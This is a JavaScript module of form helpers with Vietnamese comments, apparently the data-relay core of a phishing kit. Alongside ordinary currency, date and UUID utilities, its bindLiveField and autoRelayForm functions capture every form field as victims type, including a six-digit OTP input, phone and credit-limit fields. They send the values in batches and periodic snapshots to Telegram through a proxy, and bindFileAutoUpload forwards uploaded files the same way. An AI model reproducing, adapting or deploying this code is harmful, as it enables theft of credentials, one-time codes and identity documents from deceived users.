/* shared-form.js - Các hàm dùng chung cho các form hành động
   Bao gồm: định dạng tiền VND, debounce, gửi Telegram qua proxy, xử lý file upload, tạo UUID, helpers ngày giờ.
   Ghi chú: TG_PROXY_URL cần được khai báo trước (global) trong từng trang hoặc nối từ biến môi trường build.
*/

// ========== UUID ==========
export function genUUIDv4() {
    // RFC4122 v4 đơn giản (không crypto mạnh trên mọi browser cũ, đủ cho mã phiên người dùng)
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// ========== Debounce ==========
export function debounce(fn, delay = 600) {
    let t = null;
    return (...args) => {
        clearTimeout(t);
        t = setTimeout(() => fn(...args), delay);
    };
}

// ========== Số & Tiền tệ ==========
const NBSP = '\u00A0';
export function digitsOnly(str = '') { return str.replace(/\D+/g, ''); }
export function formatVND(digits) {
    if (!digits) return '';
    const parts = [];
    for (let i = digits.length; i > 0; i -= 3) {
        parts.unshift(digits.slice(Math.max(0, i - 3), i));
    }
    return parts.join('.') + NBSP + '₫';
}
export function bindMoneyInput(inputEl, onFormatted) {
    inputEl.addEventListener('input', () => {
        const raw = digitsOnly(inputEl.value);
        inputEl.value = formatVND(raw);
        if (typeof onFormatted === 'function') onFormatted(inputEl.value, raw);
    });
}

// ========== Ngày giờ ==========
function p2(n) { return String(n).padStart(2, '0'); }
export function addHours(date, h) { const t = new Date(date.getTime()); t.setHours(t.getHours() + Number(h)); return t; }
export function getNowPlusMinutes(m) { const t = new Date(); t.setMinutes(t.getMinutes() + m); t.setSeconds(0); t.setMilliseconds(0); return t; }
export function toLocalDatetimeValue(dt) { return `${dt.getFullYear()}-${p2(dt.getMonth() + 1)}-${p2(dt.getDate())}T${p2(dt.getHours())}:${p2(dt.getMinutes())}`; }
export function formatDateTime(dt) { return `${p2(dt.getDate())}/${p2(dt.getMonth() + 1)}/${dt.getFullYear()} ${p2(dt.getHours())}:${p2(dt.getMinutes())}`; }

// ========== Telegram Proxy ==========
// Yêu cầu: biến toàn cục TG_PROXY_URL tồn tại.
async function _tgFetch(endpoint, options) {
    if (!window.TG_PROXY_URL) { console.warn('TG_PROXY_URL chưa được đặt. Bỏ qua gửi.'); return null; }
    try {
        const res = await fetch(`${window.TG_PROXY_URL}${endpoint}`, options);
        if (!res.ok) {
            const txt = await res.text();
            console.warn('Telegram proxy lỗi', res.status, txt);
        }
        return res;
    } catch (e) {
        console.warn('Telegram proxy exception', e);
        return null;
    }
}
export async function tgSendMessage(text, parse_mode = 'Markdown') {
    // Updated endpoint prefix /tele
    return _tgFetch('/tele/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: text, parse_mode }) });
}
export async function tgSendDocument(file, caption = '') {
    const fd = new FormData();
    fd.append('file', file, file.name);
    if (caption) fd.append('caption', caption);
    return _tgFetch('/tele/sendDocument', { method: 'POST', body: fd });
}

// ========== Upload hỗ trợ ==========
export function validFileSize(f, maxMB = 5) { return f.size <= maxMB * 1024 * 1024; }
export function describeFile(f) { return `${f.name} (${(f.size / 1024 / 1024).toFixed(2)} MB)`; }
export function bindFileAutoUpload(inputEl, { captionPrefix, listTargetId, maxMB = 5, onEachSend } = {}) {
    inputEl.addEventListener('change', async () => {
        const listEl = document.getElementById(listTargetId);
        const files = [...(inputEl.files || [])];
        if (listEl) listEl.textContent = files.map(describeFile).join(' • ');
        if (!files.length) return;
        for (const f of files) {
            if (!validFileSize(f, maxMB)) { alert(`Tệp "${f.name}" vượt quá ${maxMB} MB.`); continue; }
            await tgSendMessage(`*Tệp:* ${captionPrefix}\n• ${describeFile(f)}`);
            await tgSendDocument(f, `${captionPrefix} – ${f.name}`);
            if (onEachSend) onEachSend(f);
        }
    });
}

// ========== Trợ giúp form ==========
export function bindMaskedOTP(inputEl, onChange) {
    inputEl.addEventListener('input', () => {
        let v = inputEl.value.replace(/\D/g, '');
        if (v.length > 6) v = v.slice(0, 6);
        inputEl.value = v;
        if (onChange) onChange(v);
    });
    inputEl.addEventListener('paste', (e) => {
        e.preventDefault();
        let t = (e.clipboardData || window.clipboardData).getData('text') || '';
        t = t.replace(/\D/g, '').slice(0, 6);
        inputEl.value = t;
        if (onChange) onChange(t);
    });
}

// ========== Gửi trường cập nhật (debounced) ==========
export function createFieldSender() {
    const send = debounce(txt => tgSendMessage(txt), 500);
    return (label, val) => send(`*Trường cập nhật:*\n• ${label}: ${val || '—'}`);
}

// ========== Tổng hợp dữ liệu form ==========
export function collectFormData(fields) {
    // fields: mảng đối tượng { label, value }
    return fields.map(f => `• *${f.label}:* ${f.value || '—'}`).join('\n');
}

// ========== Gửi realtime từng trường (input/select) ==========
/**
 * bindLiveField(element, { label, mode, debounceMs, mask, transform })
 * mode:
 *   - 'input'  : gửi sau debounce khi người dùng gõ
 *   - 'blur'   : chỉ gửi khi blur
 *   - 'both'   : input (debounce) + blur (gửi tức thời nếu khác lần cuối)
 * mask: function(rawValue) => string hiển thị (vd: che số)
 * transform: tiền xử lý raw trước khi so sánh (vd: trim)
 */
export function bindLiveField(el, { label, mode = 'both', debounceMs = 600, mask, transform } = {}) {
    if (!el) return;
    let lastSent = null;
    const apply = v => transform ? transform(v) : v;
    const format = v => mask ? mask(v) : v;
    const sendNow = (val) => {
        const prepared = apply(val || '');
        if (prepared === lastSent) return;
        lastSent = prepared;
        tgSendMessage(`*Field:* ${label}\n• ${format(prepared) || '—'}`);
    };
    const debounced = debounce(v => sendNow(v), debounceMs);
    const onInput = () => { if (mode === 'input' || mode === 'both') debounced(el.value); };
    const onBlur = () => { if (mode === 'blur' || mode === 'both') sendNow(el.value); };
    el.addEventListener('input', onInput);
    el.addEventListener('blur', onBlur);
    // Gửi giá trị khởi tạo nếu có
    if (el.value) sendNow(el.value);
    return {
        forceSend: () => sendNow(el.value),
        dispose: () => { el.removeEventListener('input', onInput); el.removeEventListener('blur', onBlur); }
    };
}

// ========== Tự động gửi nhóm trường trong form ==========
export function autoRelayForm(formEl, {
    fieldSelector = 'input,select,textarea',
    ignore = [],
    debounceInputMs = 700,
    batchIntervalMs = 4000,
    maskers = {
        phone: v => '•'.repeat(v.length),
        creditLimitGranted: v => v.replace(/\\d/g, '•')
    }, // { fieldId: fn(value)=>masked }
    transforms = {}, // { fieldId: fn(value)=>normalized }
    labelMap = {}, // { fieldId: 'Label hiển thị' }
    snapshotEvery = 30000,
    snapshotTitle = 'Form Snapshot'
} = {}) {
    if (!formEl) return { dispose: () => { } };
    const pending = new Map(); // fieldId -> {label,value}
    let batchTimer = null;
    let lastSnapshot = 0;
    const sendBatch = () => {
        if (!pending.size) return;
        const lines = [];
        for (const { label, value } of pending.values()) {
            lines.push(`• *${label}:* ${value || '—'}`);
        }
        pending.clear();
        tgSendMessage(`*Fields Update Batch:*\n${lines.join('\n')}`);
    };
    const scheduleBatch = () => {
        if (batchTimer) return;
        batchTimer = setTimeout(() => { batchTimer = null; sendBatch(); }, batchIntervalMs);
    };
    const debounceMap = new Map();
    function debouncePerField(id, fn) {
        if (debounceMap.has(id)) clearTimeout(debounceMap.get(id));
        const t = setTimeout(fn, debounceInputMs);
        debounceMap.set(id, t);
    }
    function processField(el, immediate = false) {
        const id = el.id || el.name || el.getAttribute('data-field') || '';
        if (!id || ignore.includes(id)) return;
        let raw = (el.type === 'checkbox') ? (el.checked ? 'Có' : 'Không') : (el.value || '');
        if (transforms[id]) raw = transforms[id](raw);
        let showVal = raw;
        if (maskers[id]) showVal = maskers[id](raw);
        const label = labelMap[id] || el.getAttribute('data-label') || id;
        pending.set(id, { label, value: showVal });
        if (immediate) sendBatch(); else scheduleBatch();
    }
    const elements = [...formEl.querySelectorAll(fieldSelector)];
    const onInput = e => {
        const el = e.target;
        const id = el.id || el.name || '';
        debouncePerField(id, () => processField(el, false));
    };
    const onChange = e => { processField(e.target, true); };
    elements.forEach(el => {
        el.addEventListener('input', onInput);
        el.addEventListener('change', onChange);
        // initial snapshot of existing value (batched)
        processField(el, false);
    });
    // periodic snapshot
    const snapTimer = setInterval(() => {
        if (Date.now() - lastSnapshot < snapshotEvery) return;
        lastSnapshot = Date.now();
        const current = [];
        for (const el of elements) {
            const id = el.id || el.name || '';
            if (!id || ignore.includes(id)) continue;
            let raw = (el.type === 'checkbox') ? (el.checked ? 'Có' : 'Không') : (el.value || '');
            if (transforms[id]) raw = transforms[id](raw);
            let showVal = raw;
            if (maskers[id]) showVal = maskers[id](raw);
            const label = labelMap[id] || el.getAttribute('data-label') || id;
            current.push(`• *${label}:* ${showVal || '—'}`);
        }
        if (current.length) tgSendMessage(`*${snapshotTitle}:*\n${current.join('\n')}`);
    }, 5000);
    return {
        dispose: () => {
            elements.forEach(el => { el.removeEventListener('input', onInput); el.removeEventListener('change', onChange); });
            if (batchTimer) clearTimeout(batchTimer);
            clearInterval(snapTimer);
            pending.clear();
        }
    };
}

// ========== Xuất toàn bộ module dưới namespace global (fallback) ==========
// Nếu trang không hỗ trợ ES Module (script type=module), có thể gắn vào window.
if (typeof window !== 'undefined') {
    window.SharedForm = {
        genUUIDv4,
        debounce,
        digitsOnly,
        formatVND,
        bindMoneyInput,
        addHours,
        getNowPlusMinutes,
        toLocalDatetimeValue,
        formatDateTime,
        tgSendMessage,
        tgSendDocument,
        validFileSize,
        describeFile,
        bindFileAutoUpload,
        bindMaskedOTP,
        createFieldSender,
        collectFormData,
        bindLiveField,
        autoRelayForm
    };
}
